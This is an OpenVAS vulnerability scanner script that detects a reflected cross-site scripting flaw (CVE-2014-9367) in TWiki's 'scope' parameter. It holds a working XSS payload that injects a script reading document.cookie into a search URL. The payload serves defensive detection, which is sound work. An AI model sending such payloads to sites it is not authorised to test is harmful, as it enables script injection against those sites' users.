###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_twiki_scope_param_xss_vuln.nasl 12952 2019-01-07 06:54:36Z ckuersteiner $
#
# TWiki 'scope' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:twiki:twiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805233");
  script_version("$Revision: 12952 $");
  script_cve_id("CVE-2014-9367");
  script_bugtraq_id(71737);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-01-07 07:54:36 +0100 (Mon, 07 Jan 2019) $");
  script_tag(name:"creation_date", value:"2015-01-06 11:20:18 +0530 (Tue, 06 Jan 2015)");

  script_name("TWiki 'scope' Parameter Cross-Site Scripting Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_twiki_detect.nasl");
  script_mandatory_keys("twiki/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"This host is installed with TWiki and is
  prone to cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"The error esists as /do/view/TWiki/WebSearch
  script does not validate input passed via the 'scope' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser
  session in the context of an affected site.");

  script_tag(name:"affected", value:"TWiki versions 6.0.0 and 6.0.1");

  script_tag(name:"solution", value:"Update to the hotfix in the referenced advisory.");

  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1031400");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/534289");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Dec/82");
  script_xref(name:"URL", value:"http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-9367");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! http_port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:http_port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/view/TWiki/WebSearch?search=Search&scope='" +
            '"--></style></script><script>alert(document.cookie)</script>';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"script><script>alert\(document.cookie\)</script>", extra_check:"[P|p]owered by TWiki")) {
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}

exit(99);
